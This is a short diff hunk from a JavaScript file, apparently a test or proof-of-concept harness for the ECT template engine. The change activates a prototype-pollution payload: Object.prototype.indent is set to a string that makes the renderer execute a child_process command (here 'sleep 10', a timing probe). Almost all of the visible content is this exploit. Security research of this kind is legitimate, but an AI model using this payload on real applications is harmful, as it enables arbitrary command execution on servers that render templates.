@@ -7,7 +7,7 @@ catch(e){
     console.log("[!] symbolic execution not enabled")
 }
 
-// Object.prototype.indent = "process.mainModule.require('child_process').execSync('sleep 10')\n//";
+Object.prototype.indent = "process.mainModule.require('child_process').execSync('sleep 10')\n//";
 
 var renderer = ECT({ root : {
 	page: '<p>Page content</p>'
